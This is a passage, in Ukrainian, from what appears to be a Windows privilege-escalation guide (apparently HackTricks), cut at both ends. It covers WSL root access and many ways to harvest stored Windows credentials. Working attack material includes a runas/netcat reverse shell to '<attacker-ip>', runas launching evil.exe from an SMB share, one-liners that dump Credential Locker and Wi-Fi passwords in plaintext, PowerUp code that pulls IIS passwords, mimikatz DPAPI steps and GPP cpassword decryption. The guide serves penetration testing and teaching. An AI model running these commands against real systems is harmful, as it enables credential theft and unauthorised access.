Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права користувача root, то зможете слухати на будь-якому порту (під час першої спроби прослуховувати порт за допомогою `nc.exe` у графічному інтерфейсі з’явиться запит, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запускати bash від root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Сам по собі доступ до `root` у Linux усередині WSL не надає прав адміністратора Windows. Якщо поточний обліковий запис Windows може читати файлову систему дистрибутива, перегляньте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли зберегтися облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` використовується в старіших інсталяціях WSL; у WSL 2 дистрибутив зазвичай зберігається у віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тож спершу визначте фактичний дистрибутив і шлях до його сховища. Під час автоматизованого переліку не виводьте вміст історії команд.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Вважайте `DefaultUserName` і `DefaultDomainName` контекстом облікового запису, а не обліковими даними. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` — це знахідка з відкритим паролем у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому вигляді не читається, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про витік облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Менеджер облікових даних / Windows vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати для **автоматичного входу користувачів**. На перший погляд може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і автоматично входити в них через браузери, але це працює не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в системи від імені користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager і Windows Vault**, щоб скористатися наданими обліковими даними замість того, щоб користувачі щоразу вводили ім’я користувача й пароль.

Якщо програми не взаємодіють із Credential Manager, гадаю, вони не зможуть використовувати облікові дані для певного ресурсу. Тож якщо ваша програма хоче використовувати сховище, вона має якось **зв’язатися з Credential Manager і запросити облікові дані для цього ресурсу** зі сховища за замовчуванням.

Використовуйте `cmdkey`, щоб переглянути список збережених на комп’ютері облікових даних.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Потім можна використовувати `runas` з параметром `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному нижче прикладі віддалений виконуваний файл запускається через спільний ресурс SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданим набором облікових даних.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому тексті в `PasswordVault` платформи Universal Windows Platform (UWP) (також відображається як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, і його можна розшифрувати нативними засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активному сеансі користувача, щоб миттєво dump і розшифрувати всі збережені імена користувачів і паролі у відкритому тексті:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Для цього шифрування використовується секрет користувача або системи, який суттєво збільшує ентропію.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від облікових даних користувача для входу**. У сценаріях із системним шифруванням використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувача, захищені DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, що зберігається поруч із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому переглянути його вміст за допомогою команди `dir` у CMD не вдасться, хоча це можна зробити через PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Для розшифрування можна використати **модуль mimikatz** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`).

**Файли облікових даних, захищені майстер-паролем,** зазвичай розташовані тут:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Ви можете використати **модуль mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
За допомогою модуля `sekurlsa::dpapi` можна **витягти багато** **masterkeys DPAPI** з **пам’яті** (якщо у вас є права root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовують для **скриптингу** й автоматизації, щоб зручно зберігати зашифровані облікові дані. Вони захищені за допомогою **DPAPI**, а це зазвичай означає, що їх може розшифрувати лише той самий користувач на тому самому комп’ютері, де їх було створено.

Експортований обліковий запис може мати довільну назву файлу або шлях `.xml`. Якщо на нього вказує скрипт чи інвентаризація файлів, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може зберігати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, який можна прочитати, — це лише зачіпка; [Windows `Export-Clixml` прив’язує зашифрований обліковий запис до користувача й комп’ютера, які його експортували](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а для будь-якого відновленого облікового запису окремо мають бути чинні права доступу до потрібної служби. Спочатку перевірте шляхи й ACL, не виводячи зашифровані чи відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, у якому вони містяться, можна виконати:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені підключення RDP

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
і в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого столу**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль **Mimikatz** `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля **Mimikatz** `sekurlsa::dpapi` можна **витягти багато DPAPI masterkeys** із пам’яті

**mRemoteNG використовує інше сховище підключень.** Перевірте читабельні XML-файли в `%APPDATA%\mRemoteNG` і документах користувача, зокрема файли зі звичайними назвами на кшталт `config.xml`. Перш ніж вважати XML-файл джерелом облікових даних, визначте схему підключень і зашифровані атрибути `Password`. Збережене значення не є паролем DPAPI/RDCMan; його відновлення залежить від параметрів шифрування файлу та використання власного master password. Під час широкого переліку не виводьте зашифровані значення.

**Експорти профілів Remote Desktop Plus** також можуть бути читабельними у каталогах користувачів або спільній теці адміністрування. У застарілому експорті `profiles.xml` є записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля джерелом облікових даних, але не виводьте його й не припускайте, що це plaintext: [виробник зазначає](https://www.donkz.nl/), що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на якому його створено, або налаштований менш суворо. Перш ніж покладатися на нього, підтвердьте походження файлу й умови відновлення.

### Sticky Notes

Люди часто використовують застосунок StickyNotes на робочих станціях Windows, щоб **зберігати паролі** й іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; його завжди варто шукати й перевіряти.

Іноді люди зберігають паролі та іншу інформацію в застосунках для нотаток. Пакетний застосунок Sticky Notes від Microsoft зазвичай зберігає нотатки за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші застосунки можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати відсутність файлу SQLite доказом відсутності нотаток, визначте встановлений застосунок і формат сховища.

Якщо Sticky Notes використовує журналювання з випереджальним записом SQLite, копія лише `plum.sqlite` може не містити нещодавніх зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і додайте `plum.sqlite-shm`, якщо він доступний; індекс спільної пам’яті можна перебудувати, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з іменем облікового запису або паролем — лише зачіпка для пошуку облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для запису із зашифрованого менеджера паролів також потрібні власне ключ дешифрування та інтерпретація, специфічна для застосунку, перш ніж його можна буде вважати підтвердженням входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібно мати права Administrator і запустити його з рівнем цілісності High Integrity.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, було налаштовано певні **облікові дані**, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних у реєстрі засобів підтримки

У деяких старих інсталяціях засобів віддаленої підтримки в реєстрі під фіксованими ключами застосунку зберігаються назви значень, пов’язані з паролями. Наприклад, у версіях TeamViewer до 9 `SecurityPasswordAES` вказував на налаштований статичний пароль сеансу, згідно з [поясненням виробника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність даних значення для читання, їхній формат і поточну поведінку автентифікації. Перехід від пароля засобу віддаленої підтримки до облікового запису Windows із вищими привілеями також потребує фактичного повторного використання пароля та авторизованого доступу до цього облікового запису. Не включайте зашифровані дані й відновлені паролі до звичайного виводу переліку.

### Спільні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [За словами Microsoft](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), захист аркуша обмежує редагування, але не є засобом безпеки; сам по собі він не підтверджує, що вміст книги зашифровано. Перевіряйте лише авторизовані файли, що стосуються справи, і не виводьте ймовірні секрети під час широкого переліку. Доступний для читання шлях `.xlsx`, захищений аркуш або прихований стовпець самі по собі не доводять, що там є облікові дані або що будь-який обліковий запис має вищі привілеї; окремо перевірте фактичні дані й поточні права облікового запису.

### Збережені патчі змін сервера CI

Сервер CI може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збірки. [TeamCity документує](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` як сховище змін віддалених запусків; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може зберегти видалені або додані посилання на файл облікових даних, ключ шифрування або скрипт, що використовує обидва. Наприклад, для робочого процесу PowerShell із `ConvertTo-SecureString -Key` потрібні AES-ключ і зашифрований рядок; [Microsoft зазначає](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ передається окремо. Спершу перегляньте лише доступні для читання назви патчів, а потім, за наявності дозволу, перевірте відповідний вміст, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення або посилання на ключ самі по собі не доводять наявності дійсних облікових даних чи доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Ротація пароля локального адміністратора власним засобом

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані сховища даних — у доступному для читання файлі `.env` або поруч із двійковим файлом засобу оновлення. Перевіряйте разом заплановане завдання засобу оновлення, обліковий запис, ACL конфігурації, прослуховувач і дозволи сховища даних. Сховище даних, доступне лише через loopback, усе одно доступне локальному користувачу з дійсними обліковими даними, але сама автентифікація не доводить наявності дозволу читати відповідні записи. Якщо поруч із зашифрованими даними доступні seed або матеріали ключа, перш ніж покладатися на шифрування, перевірте точний спосіб деривації ключа. Схема, що детерміновано виводить AES-ключ із відкритого seed за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту такого пароля; документація Go застерігає, що цей пакет не підходить для генерації випадкових даних у чутливих до безпеки сценаріях. Перш ніж вважати відновлений пароль шляхом підвищення привілеїв, переконайтеся, що він досі дійсний і належить обліковому запису з групи локальних адміністраторів. Заплановане завдання, шлях `.env` або зашифрований блок самі по собі не доводять жодної з цих умов. Не включайте паролі й матеріали ключів до звичайного виводу переліку.

Використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) для керування паролями локальних адміністраторів. Зберігання в каталозі або Entra та засоби контролю доступу до нього відрізняються від власного локального сховища даних; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища даних читати певний індекс.

### Архіви плагінів Java-сервера та повторне використання облікових даних

Деякі плагіни Java-серверів постачаються як JAR-архіви в каталозі сервера `plugins`. Доступний для читання власний плагін може містити конфігурацію або байткод із вбудованими обліковими даними служби. Перевіряйте архів лише за наявності дозволу й не включайте відновлені секрети до звичайного виводу переліку. Сам шлях до плагіна не доводить наявності секрету, а відновлений пароль служби забезпечує вищі привілеї лише тоді, коли він також дійсний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на унікальні секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle про JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire із вбудованою базою даних може зберігати `openfire.script` у `Openfire\embedded-db`. Якщо поточний обліковий запис може читати цей файл, перевірте записи `OFUSER` і властивість `passwordKey` разом. У [документації Openfire щодо постачальника користувачів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому тексті або бути зашифрованими ключем, який міститься в цій властивості. Відновлений пароль важливий для підвищення привілеїв лише тоді, коли він досі дійсний для ідентичності з вищими привілеями; сама назва файлу не доводить ані доступу на читання, ані повторного використання облікових даних. Цей шлях слугує підказкою для інвентаризації, тож не включайте вміст бази даних і облікові дані до звичайного виводу переліку.

Окремий файл `Openfire\conf\openfire.xml` може розкривати налаштовані порти й інтерфейс прив’язки консолі адміністратора навіть за використання зовнішньої бази даних. Зазвичай Openfire прив’язує консоль адміністратора до loopback; якщо прослуховувач запущений, локальний обліковий запис усе одно може звернутися до цієї адреси. Перевірте фактичний прослуховувач, авторизовану роль адміністратора, політику завантаження плагінів і обліковий запис служби Openfire разом. Адміністратор, який може встановлювати плагіни, може спричинити виконання коду плагіна в контексті служби; це може надати високі привілеї, якщо служба працює як LocalSystem. Пароль, що збігається, або доступний для читання шлях до конфігурації самі по собі не доводять доступу до консолі адміністратора чи виконання коду. Див. [посібник виробника зі встановлення та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, які зазвичай мають назву `server.config.yaml`, можуть містити `CA.private_key` внутрішнього CA. Якщо користувач із нижчими привілеями може читати цей ключ, він може створити сертифікат клієнта API. Чи призведе це до вищих привілеїв, залежить від ролей користувачів на сервері, доступності API та ідентичності, від імені якої працює сервер або агент на цільовій системі. Конфігурація клієнта містить інші дані; її виявлення не підтверджує доступу до CA сервера. У деяких розгортаннях приватний ключ CA зберігається офлайн, тож доступна для читання конфігурація сервера може не містити ключа підпису.

На сервері Windows перевірте ACL **конфігурації сервера** в каталозі інсталяції та будь-яких захищених резервних копій. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо шлях служби відрізняється, використовуйте його. Переконайтеся, що поточна ідентичність може читати файл і що `CA.private_key` справді присутній. Не виводьте приватний ключ у журнали або результати переліку. Робочий процес виробника `config api_client` використовує ключ CA для видачі сертифіката клієнта, але також потрібна відповідна роль на сервері; її створення або зміна може вимагати доступу на запис до сховища даних або перезапуску. Наявна привілейована ідентичність сервера може забезпечити шлях до доступу навіть за відсутності таких дозволів на запис. Запити API з правами на виконання запускаються в контексті відповідного сервера або агента, який може мати високі привілеї.

Захистіть конфігурацію сервера та резервні копії обмежувальними ACL, за можливості зберігайте ключ підпису CA офлайн і обмежте ролі API та доступ до прослуховувача. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації щодо налаштування безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Облікові дані PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його вбудоване зашифроване сховище може міститися в `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, а експортована резервна копія сеансів може називатися `sessions-backup.dat` і зберігатися в іншому місці. [Посібник SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначає, що експорти шифруються паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки між ними; у [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування вбудованого сховища. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває пароль і не доводить, що збережені облікові дані досі дійсні або надають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо в цьому шляху є будь-який запис, імовірно, це збережений ключ SSH. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена й ви хочете, щоб вона автоматично запускалася під час завантаження, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, ця техніка більше не працює. Я спробував створити SSH-ключі, додати їх за допомогою `ssh-add` і ввійти на машину через SSH. Реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматичного встановлення

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Файли резервних копій Windows Imaging (`.wim`), доступні для читання, також можуть містити офлайн-вулики `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **імена файлів у образі** перед розпакуванням; сама назва файла `.wim` не доводить, що в ньому є вулики, а звичайні `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. SMB-ресурс — це окремий шлях доступу, який слід перевіряти лише тоді, коли цей ресурс входить до сфери перевірки. Див. рекомендації Microsoft щодо [образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідку щодо файлів вуликів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл із назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локального адміністратора на групі комп’ютерів за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні недоліки безпеки. По-перше, об’єкти групової політики (GPO), що зберігалися як XML-файли в SYSVOL, були доступні будь-якому користувачеві домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із загальнодоступним ключем за замовчуванням, міг розшифрувати будь-який автентифікований користувач. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, що містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити й усунути цю вразливість безпеки.

Знайдіть ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Конфігурація IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
